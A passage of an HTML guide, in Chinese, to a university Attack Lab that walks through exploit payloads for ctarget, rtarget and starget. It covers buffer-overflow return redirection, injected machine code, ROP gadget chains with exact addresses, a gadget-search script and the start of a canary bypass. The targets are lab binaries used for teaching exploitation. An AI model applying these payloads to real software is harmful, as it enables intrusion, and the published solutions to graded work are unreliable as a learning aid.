+      <div class="step"><div class="h">用文件喂输入</div><div class="m"><code>./hex2raw &lt; phaseN.txt &gt; phaseN.raw</code>，再 <code>./ctarget -q -i phaseN.raw</code></div><div class="e"><code>-q</code> 关闭向 Autolab 上报，适合本地反复试；真正提交时不要加 <code>-q</code>（或按课程要求）。</div></div>
+      <div class="step"><div class="h">每次只改一个变量</div><div class="m">先让 <code>hex2raw</code> 输出长度正确，再怀疑地址，最后怀疑 gadget</div><div class="e">「Normal return」多半是没覆盖到返回地址；「Segmentation fault」多半是地址或 gadget 错了。</div></div>
+    </div>
+
+    <h3>从 tar 到 PASS：最短路径</h3>
+    <div class="steps">
+      <div class="step on"><div class="h">1 · 解包并恢复执行位</div><div class="m"><code>tar -xvf target339.tar &amp;&amp; cd target339</code><br><code>chmod +x ctarget rtarget starget hex2raw</code></div><div class="e">如果是从 Windows 拷过来的 tar，执行位可能丢了，<code>chmod</code> 这一步不能省。</div></div>
+      <div class="step"><div class="h">2 · 记下 cookie</div><div class="m"><code>cat cookie.txt</code> &nbsp;→&nbsp; <code>0x29b55047</code></div><div class="e">本页配置区已经填好；换实例时改这一处即可。</div></div>
+      <div class="step"><div class="h">3 · 取 ctarget 缓冲区地址</div><div class="m"><code>gdb -q ./ctarget</code> → <code>b *0x401c38</code> → <code>run -q -i /dev/null</code> → <code>p/x $rsp</code></div><div class="e">断点在 <code>Gets</code> 之前，输入文件用 <code>/dev/null</code> 即可；本实例得到 <code>0x55639868</code>。</div></div>
+      <div class="step"><div class="h">4 · 生成六个 payload</div><div class="m">把 §2–§8 每个生成器里的 hex 分别存成 <code>phase1.txt</code> … <code>phase6.txt</code></div><div class="e">每个生成器都有「复制 hex」按钮；命令行模板在「运行命令」折叠块里。</div></div>
+      <div class="step"><div class="h">5 · 转成 raw</div><div class="m"><code>for i in 1 2 3 4 5 6; do ./hex2raw &lt; phase$i.txt &gt; phase$i.raw; done</code></div><div class="e">也可以用 <code>./hex2raw -i phase1.txt -o phase1.raw</code> 逐个转。</div></div>
+      <div class="step"><div class="h">6 · 按目标程序分别运行</div><div class="m"><code>for i in 1 2 3; do ./ctarget -q -i phase$i.raw; done</code><br><code>for i in 4 5; do ./rtarget -q -i phase$i.raw; done</code><br><code>./starget -q -i phase6.raw</code></div><div class="e">看到六个 <code>PASS</code> 就通关；把 <code>-q</code> 去掉才是真正上报（按课程要求操作）。</div></div>
+    </div>
+
+    <h3>通关清单</h3>
+    <p class="small">勾选会保存在浏览器本地（<code>ics-attacklab-progress-v1</code>），刷新不丢。</p>
+    <div class="checklist" id="checklist">
+      <label class="checkitem"><input type="checkbox" data-ph="1"><span><span class="ct">Phase 1 · 重定向到 touch1</span><br><span class="cm">24 字节填充 + <code>touch1</code> 地址；看到 <code>Touch1!</code></span></span></label>
+      <label class="checkitem"><input type="checkbox" data-ph="2"><span><span class="ct">Phase 2 · 注入代码调用 touch2</span><br><span class="cm">在缓冲区里放 <code>mov $cookie,%edi; ret</code>；看到 <code>Touch2!(0x29b55047)</code></span></span></label>
+      <label class="checkitem"><input type="checkbox" data-ph="3"><span><span class="ct">Phase 3 · 注入字符串调用 touch3</span><br><span class="cm"><code>rdi</code> 指向缓冲区上方的 <code>"29b55047"</code>；看到 <code>Touch3!("29b55047")</code></span></span></label>
+      <label class="checkitem"><input type="checkbox" data-ph="4"><span><span class="ct">Phase 4 · ROP 调用 rtarget 的 touch2</span><br><span class="cm"><code>pop rax</code> 装 cookie，<code>mov rdi,rax</code> 传参；看到 <code>level 2 with target rtarget</code></span></span></label>
+      <label class="checkitem"><input type="checkbox" data-ph="5"><span><span class="ct">Phase 5 · ROP 调用 rtarget 的 touch3</span><br><span class="cm">用 <code>mov rax,rsp</code> + <code>add_xy</code> 现算字符串地址；看到 <code>level 3 with target rtarget</code></span></span></label>
+      <label class="checkitem"><input type="checkbox" data-ph="6"><span><span class="ct">Phase 6 · 绕过 canary 调用 starget 的 touch3</span><br><span class="cm">用 <code>memcpy</code> 覆盖自己的返回地址，<code>leave;ret</code> 直接 pivoting；看到 <code>level 3 with target starget</code></span></span></label>
+    </div>
+  </section>
+
+  <!-- ================= 1 攻击面 ================= -->
+  <section id="s1">
+    <h2>1. 攻击面：getbuf 的栈帧</h2>
+    <p class="lede">所有 phase 的起点都是同一个函数：<code>getbuf</code>。它用 <code>Gets</code> 往栈上的固定缓冲区里读一行，完全不检查长度——这就是整条攻击链的入口。</p>
+
+    <h3>1.1 反汇编</h3>
+<pre class="hexbox cmd">0000000000401c30 &lt;getbuf&gt;:
+  401c30:   endbr64
+  401c34:   sub    $0x18,%rsp        ; 在栈上开 24 字节
+  401c38:   mov    %rsp,%rdi          ; 缓冲区 = 当前 rsp
+  401c3b:   call   401f97 &lt;Gets&gt;      ; 读一行，无长度检查
+  401c40:   mov    $0x1,%eax
+  401c45:   add    $0x18,%rsp
+  401c49:   ret                       ; 从 [rsp] 取返回地址
+</pre>
+    <p><code>sub $0x18,%rsp</code> 之后，<code>rsp</code> 指向缓冲区首字节；函数返回时，<code>ret</code> 从 <code>rsp + 0x18</code> 弹出返回地址。也就是说：</p>
+    <div class="formula">payload = 24 字节填充 + 8 字节目标地址</div>
+    <p>24 字节填充可以是任意字节；第 25–32 字节会覆盖 <code>getbuf</code> 的返回地址。若只写 24 字节，<code>ret</code> 仍然回到 <code>test</code>，程序打印 <code>No exploit. Getbuf returned 0x1</code>。</p>
+
+    <h3>1.2 内存布局</h3>
+    <div class="amem">
+      <div class="row"><div class="off">rsp + 0x00</div><div class="blk buf">buffer[0 … 23]：Gets 的写入区</div><div class="note">24 字节</div></div>
+      <div class="row"><div class="off">rsp + 0x18</div><div class="blk ret">saved return address</div><div class="note">ret 从这里弹出</div></div>
+      <div class="row"><div class="off">rsp + 0x20</div><div class="blk junk">test 的栈帧 / 调用者的数据</div><div class="note">返回后由 test 继续使用</div></div>
+    </div>
+
+    <h3>1.3 怎么拿到缓冲区地址</h3>
+    <p>在 <code>gdb</code> 里让程序停在 <code>sub $0x18,%rsp</code> 之后，直接读 <code>$rsp</code>：</p>
+<pre class="hexbox cmd">$ gdb -q ./ctarget
+(gdb) disas getbuf
+(gdb) b *0x401c38          # 本实例：sub 之后、mov 之前
+(gdb) run -q -i phase1.raw
+(gdb) p/x $rsp             # 本实例得到 0x55639868
+</pre>
+    <p><code>ctarget</code> 的 <code>main</code> 调用的是 <code>stable_launch</code>，它把栈映射到固定的 <code>0x55586000</code> 附近，所以这个地址在本实例里是稳定的。换一个 tar，<code>buf_offset</code> 变了，地址也会变。</p>
+    <div class="box"><div class="t">rtarget / starget 不需要这个地址</div>
+      <code>rtarget</code> 与 <code>starget</code> 仍然用普通栈（ASLR 会改变地址），但第 4–6 关的链都通过 <code>mov rax,rsp</code> 或 <code>leave</code> 在运行时现算栈地址，所以 payload 里不需要写死缓冲区地址。这也是它们能在 ASLR 开启时通过的原因。
+    </div>
+
+    <h3>1.4 hex2raw 的输入格式</h3>
+    <p><code>hex2raw</code> 读的是「十六进制字节文本」：空白分隔，<code>#</code> 不是注释，遇到非十六进制字符会报错。每个 payload 都应存成纯字节序列，例如：</p>
+<pre class="hexbox cmd">41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41
+41 41 41 41 41 41 41 41 bc 1c 40 00 00 00 00 00
+</pre>
+    <p>转换与运行：</p>
+<pre class="hexbox cmd">$ ./hex2raw &lt; phase1.txt &gt; phase1.raw
+$ chmod +x ctarget rtarget starget hex2raw   # 若解包后丢了执行位
+$ ./ctarget -q -i phase1.raw
+</pre>
+    <div class="box warn"><div class="t">常见坑：文件末尾的换行</div>
+      <code>hex2raw</code> 会忽略空白，所以文本末尾多一个换行没关系；但不要在里面写 <code>0x41</code>（带 <code>0x</code> 前缀）——它只认两位十六进制。页内生成器输出的就是可直接喂给 <code>hex2raw</code> 的格式。
+    </div>
+  </section>
+
+  <!-- ================= 2 Phase 1 ================= -->
+  <section id="s2">
+    <h2>2. Phase 1：把返回地址改成 touch1</h2>
+    <p class="lede">最简单的一关：不注入任何代码，只把 <code>getbuf</code> 的返回地址覆盖成 <code>touch1</code>。它证明你算对了填充长度。</p>
+    <div class="phase-goal">目标：让 <code>getbuf</code> 的 <code>ret</code> 跳到 <b>0x401cbc &lt;touch1&gt;</b>。成功时打印 <code>Touch1!: You called touch1()</code>。</div>
+
+    <h3>2.1 地址从哪来</h3>
+<pre class="hexbox cmd">$ objdump -d ctarget | grep -A2 '&lt;touch1&gt;:'
+0000000000401cbc &lt;touch1&gt;:
+  401cbc:   endbr64
+  401cc0:   push   %rax
+</pre>
+    <p>本实例的 <code>touch1</code> 在 <code>0x401cbc</code>。它先把 <code>vlevel</code> 置 1，打印提示，再调用 <code>validate</code>；不需要任何参数。</p>
+
+    <h3>2.2 payload 拆解</h3>
+    <div class="tbl-wrap">
+      <table class="tbl">
+        <tr><th>偏移</th><th>长度</th><th>内容</th><th>作用</th></tr>
+        <tr><td class="mono">0</td><td class="mono">24</td><td class="mono">任意字节（如 41）</td><td>填满 <code>getbuf</code> 的 24 字节缓冲区</td></tr>
+        <tr><td class="mono">24</td><td class="mono">8</td><td class="mono">bc 1c 40 00 00 00 00 00</td><td><code>0x401cbc</code> 的小端表示，覆盖返回地址</td></tr>
+      </table>
+    </div>
+    <div class="builder" data-phase="1">
+      <div class="bh">Phase 1 payload</div>
+      <div class="bs">32 字节；前 24 字节填充，后 8 字节是 <code>touch1</code>。</div>
+    </div>
+
+    <div class="box ok"><div class="t">预期输出</div>
+      <p class="mono" style="margin:4px 0">Cookie: 0x29b55047<br>Touch1!: You called touch1()<br>Valid solution for level 1 with target ctarget</p>
+    </div>
+  </section>
+
+  <!-- ================= 3 Phase 2 ================= -->
+  <section id="s3">
+    <h2>3. Phase 2：注入代码，给 touch2 传 cookie</h2>
+    <p class="lede">这次不能只改返回地址：<code>touch2</code> 会比较第一个参数 <code>%edi</code> 和 <code>cookie</code>。你得在缓冲区里放一小段机器码，先把 cookie 装进 <code>%edi</code>，再跳到 <code>touch2</code>。</p>
+    <div class="phase-goal">目标：执行 <b>0x401cf0 &lt;touch2&gt;</b>，且 <code>%edi == 0x29b55047</code>。成功时打印 <code>Touch2!: You called touch2(0x29b55047)</code>。</div>
+
+    <h3>3.1 touch2 在比较什么</h3>
+<pre class="hexbox cmd">0000000000401cf0 &lt;touch2&gt;:
+  401cf0:   endbr64
+  401cf4:   push   %rax
+  401cf5:   pop    %rax
+  401cf6:   sub    $0x8,%rsp
+  401cfa:   mov    %edi,%edx
+  401cfc:   movl   $0x2,0x481e(%rip)      # vlevel = 2
+  401d06:   cmp    %edi,0x4820(%rip)      # 比较 cookie 和 %edi
+  401d0c:   je     401d38 &lt;touch2+0x48&gt;
+  ...                                  # 不相等就 fail
+</pre>
+    <p><code>getbuf</code> 返回时，<code>%rdi</code> 里还残留着 <code>Gets</code> 用过的指针（指向缓冲区），不是 cookie。所以必须自己设置 <code>%edi</code>。</p>
+
+    <h3>3.2 注入的指令</h3>
+    <p>用一条 <code>mov $imm32,%edi</code> 加一条 <code>ret</code>：</p>
+    <div class="formula">BF 47 50 B5 29 C3 &nbsp;=&nbsp; mov $0x29b55047,%edi ; ret</div>
+    <p>这 6 个字节放在缓冲区开头。注意 <code>getbuf</code> 的 <code>ret</code> 跳到缓冲区后，<code>rsp</code> 已经指向 <code>buffer + 32</code>；注入代码最后的 <code>ret</code> 会从 <code>buffer + 32</code> 取下一个地址。因此布局是：</p>
+    <div class="amem">
+      <div class="row"><div class="off">buffer + 0</div><div class="blk code">BF 47 50 B5 29 C3</div><div class="note">mov + ret（6 字节）</div></div>
+      <div class="row"><div class="off">buffer + 6</div><div class="blk junk">填充到 24 字节</div><div class="note">任意字节</div></div>
+      <div class="row"><div class="off">buffer + 24</div><div class="blk buf">buffer 的地址（0x55639868）</div><div class="note">getbuf 的 ret 弹到这里</div></div>
+      <div class="row"><div class="off">buffer + 32</div><div class="blk ret">touch2 的地址（0x401cf0）</div><div class="note">注入代码的 ret 弹到这里</div></div>
+    </div>
+    <p>为什么 <code>buffer + 24</code> 不直接放 <code>touch2</code>？因为 <code>getbuf</code> 的 <code>ret</code> 只负责跳到缓冲区；跳到缓冲区后，CPU 先执行你的 <code>mov</code>，再执行你的 <code>ret</code>，那时 <code>rsp</code> 已经前进到 <code>buffer + 32</code>。把 <code>touch2</code> 放在 <code>+32</code>，才能被第二条 <code>ret</code> 正确弹出。</p>
+
+    <div class="builder" data-phase="2">
+      <div class="bh">Phase 2 payload</div>
+      <div class="bs">40 字节；代码 6 字节 + 18 字节填充 + 缓冲区地址 + touch2 地址。</div>
+    </div>
+
+    <div class="box ok"><div class="t">预期输出</div>
+      <p class="mono" style="margin:4px 0">Touch2!: You called touch2(0x29b55047)<br>Valid solution for level 2 with target ctarget</p>
+    </div>
+  </section>
+
+  <!-- ================= 4 Phase 3 ================= -->
+  <section id="s4">
+    <h2>4. Phase 3：注入字符串，给 touch3 传指针</h2>
+    <p class="lede">这一关把参数从「整数」换成「字符串指针」：<code>touch3</code> 要求 <code>%rdi</code> 指向一个内容为 cookie 十六进制串的 C 字符串。代码比上一关长一点，真正的坑在字符串放哪。</p>
+    <div class="phase-goal">目标：执行 <b>0x401e16 &lt;touch3&gt;</b>，且 <code>%rdi</code> 指向 <code>"29b55047\0"</code>。成功时打印 <code>Touch3!: You called touch3("29b55047")</code>。</div>
+
+    <h3>4.1 touch3 / hexmatch</h3>
+    <p><code>touch3</code> 把 <code>%rdi</code> 原样传给 <code>hexmatch(cookie, s)</code>；<code>hexmatch</code> 用 <code>sprintf("%.8x", cookie)</code> 生成 8 位小写十六进制，再用 <code>strncmp(..., 9)</code> 比较，包含结尾的 <code>\0</code>。所以字符串必须是 8 位小写十六进制、以 NUL 结尾。</p>
+
+    <h3>4.2 注入的指令与布局</h3>
+    <p>用 <code>movabs</code> 把 64 位字符串地址装进 <code>%rdi</code>：</p>
+    <div class="formula">48 BF &lt;字符串地址&gt; C3 &nbsp;=&nbsp; movabs $地址,%rdi ; ret</div>
+    <p>字符串放在 <code>buffer + 40</code>：</p>
+    <div class="amem">
+      <div class="row"><div class="off">buffer + 0</div><div class="blk code">48 BF 90 98 63 55 00 00 00 00 C3</div><div class="note">10 字节的 movabs + ret</div></div>
+      <div class="row"><div class="off">buffer + 10</div><div class="blk junk">填充到 24 字节</div><div class="note">任意字节</div></div>
+      <div class="row"><div class="off">buffer + 24</div><div class="blk buf">buffer 的地址（0x55639868）</div><div class="note">getbuf 的 ret</div></div>
+      <div class="row"><div class="off">buffer + 32</div><div class="blk ret">touch3 的地址（0x401e16）</div><div class="note">注入代码的 ret</div></div>
+      <div class="row"><div class="off">buffer + 40</div><div class="blk chain">"29b55047\0"</div><div class="note">9 字节字符串</div></div>
+    </div>
+
+    <h3>4.3 为什么字符串不能放在 buffer + 16</h3>
+    <p>这是本关最经典的错误。把字符串放在 <code>buffer + 16</code> 时，它正好落在 <code>touch3</code> / <code>hexmatch</code> 的栈帧会覆盖的区域：</p>
+    <div class="amem">
+      <div class="row"><div class="off">buffer + 0</div><div class="blk code">movabs 代码（10 字节）</div><div class="note">安全</div></div>
+      <div class="row"><div class="off">buffer + 16</div><div class="blk ret">会被 call/ push 覆盖</div><div class="note">touch3 的返回地址、hexmatch 的 push 都落在这里</div></div>
+      <div class="row"><div class="off">buffer + 24</div><div class="blk junk">返回地址槽</div><div class="note">执行时已被消费</div></div>
+      <div class="row"><div class="off">buffer + 40</div><div class="blk chain">字符串放这里</div><div class="note">在 touch3 入口的 rsp 之上，不会被压栈覆盖</div></div>
+    </div>
+    <p>实测把 <code>"29b55047"</code> 放在 <code>buffer + 16</code>，<code>touch3</code> 收到的指针虽然正确，但读到的内容已经被栈帧破坏，输出类似 <code>Misfire: You called touch3("…")</code>。放到 <code>buffer + 40</code> 就稳定通过。</p>
+    <div class="box warn"><div class="t">字符串地址要跟着缓冲区地址走</div>
+      本页生成器用 <code>buffer + 40</code> 计算 <code>movabs</code> 的立即数。如果你改了「ctarget 缓冲区地址」，代码里的 <code>90 98 63 55 …</code> 会同步变化；不要手动只改一处。
+    </div>
+
+    <div class="builder" data-phase="3">
+      <div class="bh">Phase 3 payload</div>
+      <div class="bs">49 字节；movabs 代码 + 填充 + buffer 地址 + touch3 地址 + 9 字节字符串。</div>
+    </div>
+
+    <div class="box ok"><div class="t">预期输出</div>
+      <p class="mono" style="margin:4px 0">Touch3!: You called touch3("29b55047")<br>Valid solution for level 3 with target ctarget</p>
+    </div>
+  </section>
+
+  <!-- ================= 5 ROP ================= -->
+  <section id="s5">
+    <h2>5. 从 ret 到 ROP：gadget farm</h2>
+    <p class="lede"><code>rtarget</code> 和 <code>starget</code> 的栈不可执行（NX），把代码写进缓冲区再跳过去会直接段错误。攻击者剩下的武器是程序自己已经编译好的指令片段：<b>gadget</b>。每个 gadget 以 <code>ret</code> 结尾，把它们的地址依次排在栈上，就能让 CPU 像「返回」一样一串串执行下去。</p>
+
+    <h3>5.1 gadget 不必是函数</h3>
+    <p>x86-64 是变长指令集：从一条指令的中间某个字节开始解码，可能得到完全不同的指令。下面这段 <code>getval_418</code> 的本意是 <code>mov $0x58a5cb24,%eax</code>，但它的立即数里藏着 <code>58 c3</code>：</p>
+<pre class="hexbox cmd">0000000000401f15 &lt;getval_418&gt;:
+  401f15:   f3 0f 1e fa          endbr64
+  401f19:   b8 24 cb a5 58       mov    $0x58a5cb24,%eax
+  401f1e:   c3                   ret
+</pre>
+    <p>从 <code>0x401f1d</code> 开始读，字节是 <code>58 c3</code>，也就是：</p>
+    <div class="formula">0x401f1d: 58 c3 &nbsp;=&nbsp; pop %rax ; ret</div>
+    <p>这就是为什么不能只靠 <code>objdump</code> 的正常反汇编找 gadget——它不会把指令中间的字节单独列出来。要找 <code>pop rdi; ret</code>（<code>5f c3</code>）、<code>pop rsi; ret</code>（<code>5e c3</code>）这类序列，得按字节扫。</p>
+
+    <h3>5.2 本实例 rtarget 可用的 gadget</h3>
+    <div class="tbl-wrap">
+      <table class="tbl">
+        <tr><th>地址</th><th>字节</th><th>指令</th><th>用途</th></tr>
+        <tr><td class="mono">0x401f1d</td><td class="mono">58 c3</td><td class="gadget">pop %rax ; ret</td><td>把栈上的 8 字节装进 <code>rax</code></td></tr>
+        <tr><td class="mono">0x401f11</td><td class="mono">48 89 c7 c3</td><td class="gadget">mov %rax,%rdi ; ret</td><td>把 <code>rax</code> 传给第一个参数</td></tr>
+        <tr><td class="mono">0x401f6f</td><td class="mono">91 c3</td><td class="gadget">xchg %eax,%ecx ; ret</td><td>把低 32 位转到 <code>ecx</code></td></tr>
+        <tr><td class="mono">0x401f6d</td><td class="mono">89 ce 91 c3</td><td class="gadget">mov %ecx,%esi ; xchg %eax,%ecx ; ret</td><td>把 <code>ecx</code> 装进 <code>esi</code>（第二个参数）</td></tr>
+        <tr><td class="mono">0x401f8e</td><td class="mono">48 89 e0 c3</td><td class="gadget">mov %rsp,%rax ; ret</td><td>拿到当前栈指针</td></tr>
+        <tr><td class="mono">0x401f52</td><td class="mono">f3 0f 1e fa 48 8d 04 37 c3</td><td class="gadget">endbr64 ; lea (%rdi,%rsi,1),%rax ; ret</td><td><code>add_xy</code>：<code>rax = rdi + rsi</code></td></tr>
+        <tr><td class="mono">0x401c7e</td><td class="mono">—</td><td class="gadget">touch2</td><td>第 4 关目标</td></tr>
+        <tr><td class="mono">0x401da4</td><td class="mono">—</td><td class="gadget">touch3</td><td>第 5 关目标</td></tr>
+      </table>
+    </div>
+    <p class="small">这些地址来自本实例的 <code>rtarget</code>。farm 的范围是 <code>0x401eea &lt;start_farm&gt;</code> 到 <code>0x4020b3 &lt;end_farm&gt;</code>；按实验规则只应使用 farm 里的 gadget。注意 <code>starget</code> 的 farm 布局与本文件不同，地址要单独取（见 §8.4）。</p>
+
+    <h3>5.3 怎么自己找 gadget</h3>
+    <p>先反汇编 farm 并带上原始字节：</p>
+<pre class="hexbox cmd">$ objdump -d -M intel --start-address=0x401eea --stop-address=0x4020b3 rtarget
+</pre>
+    <p>再按字节模式搜索。例如要找 <code>pop %rax; ret</code>，就是找 <code>58 c3</code>；要找 <code>mov %rax,%rdi; ret</code>，就是找 <code>48 89 c7 c3</code>。下面这段脚本把整个 <code>.text</code> 读出来做模式匹配，适合确认地址：</p>
+<pre class="hexbox cmd">$ python3 - &lt;&lt;'PY'
+import subprocess, re
+subprocess.run(['objcopy','-O','binary','--only-section=.text','rtarget','/tmp/t.bin'],check=True)
+data = open('/tmp/t.bin','rb').read()
+base = 0x401240          # .text 的 VMA
+for name, pat in {
+    'pop rax; ret'      : b'\x58\xc3',
+    'mov rdi,rax; ret'  : b'\x48\x89\xc7\xc3',
+    'mov rax,rsp; ret'  : b'\x48\x89\xe0\xc3',
+    'xchg eax,ecx; ret' : b'\x91\xc3',
+}.items():
+    print(name, [hex(base + m.start()) for m in re.finditer(re.escape(pat), data)])
+PY
+</pre>
+    <p>注意 <code>base</code> 不是 <code>0x401000</code>：<code>.text</code> 的 VMA 是 <code>0x401240</code>（用 <code>readelf -S rtarget</code> 确认）。如果反汇编器/脚本给出的地址整体偏移，先对一下 <code>start_farm</code> 的地址。</p>
+
+    <div class="box"><div class="t">ROP 链就是一张 qword 表</div>
+      每个 gadget 的地址占 8 字节，后面跟着它要 <code>pop</code> 的数据。CPU 执行 <code>ret</code> 时自动把 <code>rsp</code> 加 8，所以链会自然往下走。写 payload 时，本质上是把「地址、数据、地址、数据……」按小端序铺在栈上。
+    </div>
+  </section>
+
+  <!-- ================= 6 Phase 4 ================= -->
+  <section id="s6">
+    <h2>6. Phase 4：ROP 调用 rtarget 的 touch2</h2>
+    <p class="lede">目标与 ctarget 的 phase 2 一样：让 <code>touch2(cookie)</code> 通过。但这次不能注入 <code>mov</code>，只能用 farm 里的 gadget 把 cookie 装进 <code>%edi</code>。</p>
+    <div class="phase-goal">目标：执行 <b>0x401c7e &lt;touch2&gt;</b>，且 <code>%edi == 0x29b55047</code>。成功时打印 <code>Touch2!: You called touch2(0x29b55047)</code>，并显示 <code>level 2 with target rtarget</code>。</div>
+
+    <h3>6.1 为什么不用 pop rdi</h3>
+    <p>最直觉的链是 <code>pop rdi; ret</code> + cookie + <code>touch2</code>，但本实例的 farm 里没有 <code>5f c3</code>。有 <code>pop rax; ret</code>（<code>58 c3</code>）和 <code>mov rdi,rax; ret</code>（<code>48 89 c7 c3</code>），所以改成：</p>
+    <div class="formula">pop rax ; cookie ; mov rdi,rax ; touch2</div>
+    <p>先把 cookie 弹进 <code>rax</code>，再整体搬到 <code>rdi</code>。这两条 gadget 都在 farm 里，且不需要知道栈地址。</p>
+
+    <h3>6.2 链的布局</h3>
+    <div class="amem">
+      <div class="row"><div class="off">buffer + 0</div><div class="blk junk">24 字节填充</div><div class="note">填满 getbuf 缓冲区</div></div>
+      <div class="row"><div class="off">buffer + 24</div><div class="blk chain">0x401f1d &nbsp; pop %rax ; ret</div><div class="note">链的第 1 个 qword</div></div>
+      <div class="row"><div class="off">buffer + 32</div><div class="blk buf">0x29b55047</div><div class="note">被 pop 进 rax 的 cookie</div></div>
+      <div class="row"><div class="off">buffer + 40</div><div class="blk chain">0x401f11 &nbsp; mov %rax,%rdi ; ret</div><div class="note">传参</div></div>
+      <div class="row"><div class="off">buffer + 48</div><div class="blk ret">0x401c7e &nbsp; touch2</div><div class="note">目标函数</div></div>
+    </div>
+
+    <div class="builder" data-phase="4">
+      <div class="bh">Phase 4 payload</div>
+      <div class="bs">56 字节；24 填充 + 4 个 qword。</div>
+    </div>
+
+    <div class="box ok"><div class="t">预期输出</div>
+      <p class="mono" style="margin:4px 0">Touch2!: You called touch2(0x29b55047)<br>Valid solution for level 2 with target rtarget</p>
+    </div>
+    <div class="box"><div class="t">为什么不怕 ASLR</div>
+      这条链只用了代码段里的固定地址和立即数 cookie，没有任何栈地址。即使 <code>rtarget</code> 的栈每次运行都不同，链也照样工作。
+    </div>
+  </section>
+
+  <!-- ================= 7 Phase 5 ================= -->
+  <section id="s7">
+    <h2>7. Phase 5：ROP 调用 rtarget 的 touch3</h2>
+    <p class="lede">这一关的 ROP 要把 <code>%rdi</code> 指向栈上的字符串 <code>"29b55047"</code>。难点是 farm 里既没有 <code>pop rdi</code>，也没有 <code>pop rsi</code>；你得用 <code>rsp</code> 和 <code>add_xy</code> 现算地址。</p>
+    <div class="phase-goal">目标：执行 <b>0x401da4 &lt;touch3&gt;</b>，且 <code>%rdi</code> 指向 <code>"29b55047\0"</code>。成功时显示 <code>level 3 with target rtarget</code>。</div>
+
+    <h3>7.1 思路：先拿 rsp，再加偏移</h3>
+    <p>链执行到 <code>mov %rsp,%rax</code> 时，<code>rsp</code> 正好指向链里的下一个 qword。把这个值当作基准，加上字符串相对它的偏移，就得到字符串地址。计算需要两个操作数，于是：</p>
+    <ol>
+      <li><code>pop rax</code> 把偏移量（本例 <code>32</code>）装进 <code>rax</code>；</li>
+      <li><code>xchg eax,ecx</code> 把偏移转到 <code>ecx</code>；</li>
+      <li><code>mov esi,ecx</code> 把它装进第二个参数 <code>rsi</code>；</li>
+      <li><code>mov rax,rsp</code> 拿到基准地址，<code>mov rdi,rax</code> 放进第一个参数；</li>
+      <li><code>add_xy</code> 算出 <code>rax = rdi + rsi</code>；</li>
+      <li><code>mov rdi,rax</code> 把结果传给 <code>touch3</code>。</li>
+    </ol>
+
+    <h3>7.2 偏移为什么是 32</h3>
+    <p>链从 <code>buffer + 24</code> 开始。执行到 <code>mov rax,rsp</code> 这条 gadget（位于 <code>buffer + 56</code>）时，<code>ret</code> 已经把 <code>rsp</code> 推到 <code>buffer + 64</code>。字符串放在 <code>buffer + 96</code>，所以：</p>
+    <div class="formula">96 − 64 = 32</div>
+    <p>如果你在链中增删 gadget，这个偏移必须跟着重算；不要无脑抄 32。</p>
+
+    <h3>7.3 链的布局</h3>
+    <div class="tbl-wrap">
+      <table class="tbl">
+        <tr><th>偏移</th><th>qword</th><th>含义</th></tr>
+        <tr><td class="mono">24</td><td class="mono">0x401f1d</td><td><code>pop rax; ret</code></td></tr>
+        <tr><td class="mono">32</td><td class="mono">0x00000020</td><td>偏移量 32</td></tr>
+        <tr><td class="mono">40</td><td class="mono">0x401f6f</td><td><code>xchg eax,ecx; ret</code></td></tr>
+        <tr><td class="mono">48</td><td class="mono">0x401f6d</td><td><code>mov esi,ecx; xchg eax,ecx; ret</code></td></tr>
+        <tr><td class="mono">56</td><td class="mono">0x401f8e</td><td><code>mov rax,rsp; ret</code>（此时 rsp = buffer+64）</td></tr>
+        <tr><td class="mono">64</td><td class="mono">0x401f11</td><td><code>mov rdi,rax; ret</code></td></tr>
+        <tr><td class="mono">72</td><td class="mono">0x401f52</td><td><code>add_xy</code></td></tr>
+        <tr><td class="mono">80</td><td class="mono">0x401f11</td><td><code>mov rdi,rax; ret</code></td></tr>
+        <tr><td class="mono">88</td><td class="mono">0x401da4</td><td><code>touch3</code></td></tr>
+        <tr><td class="mono">96</td><td class="mono">"29b55047\0"</td><td>9 字节字符串</td></tr>
+      </table>
+    </div>
+
+    <div class="builder" data-phase="5">
+      <div class="bh">Phase 5 payload</div>
+      <div class="bs">105 字节；24 填充 + 9 个 qword + 9 字节字符串。</div>
+    </div>
+
+    <div class="box ok"><div class="t">预期输出</div>
+      <p class="mono" style="margin:4px 0">Touch3!: You called touch3("29b55047")<br>Valid solution for level 3 with target rtarget</p>
+    </div>
+
+    <div class="box warn"><div class="t">如果报段错误，先查这三个地方</div>
+      ① <code>add_xy</code> 的地址是不是 <code>0x401f52</code>（不是 farm 里别的 <code>lea</code>）；② <code>mov rax,rsp</code> 的地址是不是 <code>0x401f8e</code>；③ 偏移 32 是否与字符串位置匹配——把字符串往后挪 8 字节，偏移就要改成 40。
+    </div>
+  </section>
+
+  <!-- ================= 8 Phase 6 ================= -->
+  <section id="s8">
+    <h2>8. Phase 6：绕过 canary，调用 starget 的 touch3</h2>
+    <p class="lede"><code>starget</code> 在 <code>getbuf_withcanary</code> 里放了栈保护：缓冲区后面有一个从 <code>%fs:0x28</code> 取来的 canary，函数返回前会检查它。直接覆盖返回地址会先触发 <code>__stack_chk_fail</code>。这一关的突破口不是猜 canary，而是函数里那次 <code>memcpy</code>。</p>
+    <div class="phase-goal">目标：执行 <b>0x401dab &lt;touch3&gt;</b>，且 <code>%rdi</code> 指向 <code>"29b55047\0"</code>。成功时显示 <code>level 3 with target starget</code>。</div>
+
+    <h3>8.1 栈帧与 canary</h3>
+<pre class="hexbox cmd">0000000000401e7f &lt;getbuf_withcanary&gt;:
+  401e7f:   push   %rbp
+  401e80:   mov    %rsp,%rbp
+  401e83:   sub    $0x120,%rsp
+  401e8a:   mov    %fs:0x28,%rax
+  401e93:   mov    %rax,-0x8(%rbp)      ; canary 放在 rbp-8
+  401e99:   movl   $0x0,-0x1c(%rbp)    ; offset = 0
+  401ea0:   lea    -0xa0(%rbp),%rax
+  401ea7:   mov    %rax,%rdi
+  401eaa:   call   402171 &lt;Gets&gt;      ; 读入 rbp-0xa0
+  401eaf:   mov    -0x1c(%rbp),%eax    ; 读回 offset
+  401eb4:   lea    -0x120(%rbp),%rdx
+  401ebb:   lea    (%rdx,%rax,1),%rcx  ; dst = rbp-0x120+offset
+  401ebf:   lea    -0xa0(%rbp),%rax    ; src = rbp-0xa0
+  401ec6:   mov    $0x80,%edx         ; 128 字节
+  401ecb:   mov    %rax,%rsi
+  401ece:   mov    %rcx,%rdi
+  401ed1:   call   401140 &lt;memcpy@plt&gt;
+  401ed6:   mov    $0x1,%eax
+  401edb:   mov    -0x8(%rbp),%rsi
+  401edf:   xor    %fs:0x28,%rsi
+  401ee8:   je     401eef
+  401eea:   call   402660 &lt;__stack_chk_fail&gt;
